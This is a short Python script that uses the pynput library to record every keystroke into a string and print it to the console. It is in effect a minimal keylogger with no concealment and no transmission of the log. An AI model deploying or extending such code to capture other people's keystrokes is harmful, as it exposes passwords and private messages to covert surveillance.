#!/usr/bin/env python
import pynput.keyboard

log = ''

def process_key_input(key):
    global log
    log = log + str(key)
    print(log)


keyboard_listener = pynput.keyboard.Listener(on_press=process_key_input)

with keyboard_listener:
    keyboard_listener.join()
